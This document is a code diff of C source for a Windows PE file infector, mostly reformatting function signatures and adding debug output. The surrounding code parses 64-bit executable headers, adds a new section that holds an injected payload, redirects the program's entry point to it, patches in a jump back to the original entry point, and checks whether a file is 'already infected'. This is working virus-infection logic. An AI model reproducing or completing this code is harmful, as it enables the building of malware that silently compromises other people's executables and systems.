@@ -18,7 +18,12 @@
  *
  * @return 0 on success, non-zero on failure.
  */
-int load_file(const char *filename, HANDLE *hFile, BYTE **fileBuffer, DWORD *fileSize) {
+int load_file(
+  const char *filename,
+  HANDLE *hFile,
+  BYTE **fileBuffer,
+  DWORD *fileSize
+) {
     printf("[DEBUG] Opening file: %s\n", filename);
     *hFile = CreateFileA(filename, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (*hFile == INVALID_HANDLE_VALUE) {
@@ -53,7 +58,11 @@ int load_file(const char *filename, HANDLE *hFile, BYTE **fileBuffer, DWORD *fil
  *
  * @return 0 on success, non-zero on failure.
  */
-int parse_pe_headers(BYTE *fileBuffer, IMAGE_DOS_HEADER **dos, IMAGE_NT_HEADERS64 **nt) {
+int parse_pe_headers(
+  BYTE *fileBuffer,
+  IMAGE_DOS_HEADER **dos,
+  IMAGE_NT_HEADERS64 **nt
+) {
     *dos = (IMAGE_DOS_HEADER *)fileBuffer;
     if ((*dos)->e_magic != IMAGE_DOS_SIGNATURE) {
         printf("[ERROR] Invalid DOS signature\n");
@@ -79,7 +88,14 @@ int parse_pe_headers(BYTE *fileBuffer, IMAGE_DOS_HEADER **dos, IMAGE_NT_HEADERS6
  * @param file_align File alignment value from PE header.
  * @param payload_size Size of the payload to inject.
  */
-void prepare_new_section(IMAGE_SECTION_HEADER *newSection, IMAGE_SECTION_HEADER *lastSection, DWORD lastSectionSize, DWORD section_align, DWORD file_align, DWORD payload_size) {
+void prepare_new_section(
+  IMAGE_SECTION_HEADER *newSection,
+  IMAGE_SECTION_HEADER *lastSection,
+  DWORD lastSectionSize,
+  DWORD section_align,
+  DWORD file_align,
+  DWORD payload_size
+) {
     memcpy(newSection->Name, SECTION_NAME, IMAGE_SIZEOF_SHORT_NAME);
     newSection->VirtualAddress = ALIGN_UP(lastSection->VirtualAddress + lastSectionSize, section_align);
     newSection->PointerToRawData = ALIGN_UP(lastSection->PointerToRawData + lastSection->SizeOfRawData, file_align);
@@ -91,15 +107,24 @@ void prepare_new_section(IMAGE_SECTION_HEADER *newSection, IMAGE_SECTION_HEADER 
 
 /*
  * @brief Patches the payload with the correct delta value.
+ *
  * @param payload_copy Pointer to the buffer to receive the patched payload.
  * @param payload Pointer to the original payload.
  * @param payload_size Size of the payload.
  * @param offset_delta Offset in the payload where the delta should be patched.
  * @param oldEntryPointOffset Value to patch (relative offset to OEP).
  */
-void patch_payload(BYTE *payload_copy, BYTE *payload, size_t payload_size, size_t offset_delta, uint64_t oldEntryPointOffset) {
+void patch_payload(
+  BYTE *payload_copy,
+  BYTE *payload,
+  size_t payload_size,
+  size_t offset_delta,
+  int64_t oldEntryPointOffset
+) {
     memcpy(payload_copy, payload, payload_size);
-    *(uint64_t *)(payload_copy + offset_delta) = (uint64_t)oldEntryPointOffset;
+    printf("[DEBUG] Patching payload at offset %zu with old entry point offset 0x%llX\n", offset_delta, (unsigned long long)oldEntryPointOffset);
+    // Patch the delta in the payload
+    *(int64_t *)(payload_copy + offset_delta) = oldEntryPointOffset;
     printf("[DEBUG] Patch delta at offset %zu with value 0x%llX\n", offset_delta, (unsigned long long)oldEntryPointOffset);
 }
 
@@ -111,7 +136,12 @@ void patch_payload(BYTE *payload_copy, BYTE *payload, size_t payload_size, size_
  * @param payload_size Size of the payload.
  * @param section_align Section alignment value from PE header.
  */
-void update_pe_headers(IMAGE_NT_HEADERS64 *nt, IMAGE_SECTION_HEADER *newSection, DWORD payload_size, DWORD section_align) {
+void update_pe_headers(
+  IMAGE_NT_HEADERS64 *nt,
+  IMAGE_SECTION_HEADER *newSection,
+  DWORD payload_size,
+  DWORD section_align
+) {
     nt->FileHeader.NumberOfSections += 1;
     nt->OptionalHeader.SizeOfImage = newSection->VirtualAddress + ALIGN_UP(payload_size, section_align);
     nt->OptionalHeader.AddressOfEntryPoint = newSection->VirtualAddress;
@@ -131,7 +161,14 @@ void update_pe_headers(IMAGE_NT_HEADERS64 *nt, IMAGE_SECTION_HEADER *newSection,
  *
  * @return 0 on success, non-zero on failure.
  */
-int write_headers(HANDLE hFile, IMAGE_DOS_HEADER *dos, IMAGE_NT_HEADERS64 *nt, IMAGE_SECTION_HEADER *sections, WORD oldNumberOfSections, IMAGE_SECTION_HEADER *newSection) {
+int write_headers(
+  HANDLE hFile,
+  IMAGE_DOS_HEADER *dos,
+  IMAGE_NT_HEADERS64 *nt,
+  IMAGE_SECTION_HEADER *sections,
+  WORD oldNumberOfSections,
+  IMAGE_SECTION_HEADER *newSection
+) {
     SetFilePointer(hFile, dos->e_lfanew, NULL, FILE_BEGIN);
     DWORD ntHeadersSize = sizeof(IMAGE_NT_HEADERS64) + nt->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER);
     BYTE *ntHeadersBuffer = (BYTE *)HeapAlloc(GetProcessHeap(), 0, ntHeadersSize);
@@ -163,7 +200,12 @@ int write_headers(HANDLE hFile, IMAGE_DOS_HEADER *dos, IMAGE_NT_HEADERS64 *nt, I
  *
  * @return 0 on success, non-zero on failure.
  */
-int write_payload(HANDLE hFile, IMAGE_SECTION_HEADER *newSection, BYTE *payload_copy, DWORD payload_size) {
+int write_payload(
+  HANDLE hFile,
+  IMAGE_SECTION_HEADER *newSection,
+  BYTE *payload_copy,
+  DWORD payload_size
+) {
     printf("[DEBUG] Writing payload to new section...\n");
     SetFilePointer(hFile, newSection->PointerToRawData, NULL, FILE_BEGIN);
     DWORD bytesWritten;
@@ -183,7 +225,11 @@ int write_payload(HANDLE hFile, IMAGE_SECTION_HEADER *newSection, BYTE *payload_
  *
  * @return 0 on success, non-zero on failure.
  */
-int pad_section(HANDLE hFile, IMAGE_SECTION_HEADER *newSection, DWORD payload_size) {
+int pad_section(
+  HANDLE hFile,
+  IMAGE_SECTION_HEADER *newSection,
+  DWORD payload_size
+) {
     if (newSection->SizeOfRawData > payload_size) {
         DWORD zeroSize = newSection->SizeOfRawData - payload_size;
         BYTE *zeroBuffer = (BYTE *)calloc(1, zeroSize);
@@ -211,7 +257,10 @@ int pad_section(HANDLE hFile, IMAGE_SECTION_HEADER *newSection, DWORD payload_si
  *
  * @return 1 if already infected, 0 otherwise.
  */
-int is_already_infected(IMAGE_NT_HEADERS64 *nt, IMAGE_SECTION_HEADER *sections) {
+int is_already_infected(
+  IMAGE_NT_HEADERS64 *nt,
+  IMAGE_SECTION_HEADER *sections
+) {
     int i;
     for (i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
         if (strncmp((const char *)sections[i].Name, SECTION_NAME, strlen(SECTION_NAME)) == 0) {
@@ -269,6 +318,7 @@ int inject(const char *filename) {
     prepare_new_section(&newSection, lastSection, lastSectionSize, section_align, file_align, payload_size);
 
     size_t offset_delta = (size_t)((BYTE *)&delta - payload);
+    printf("[DEBUG] Offset delta for patching: %zu\n", offset_delta);
     BYTE *payload_copy = (BYTE *)malloc(payload_size);
     if (!payload_copy) {
         printf("[ERROR] Memory allocation for payload failed\n");
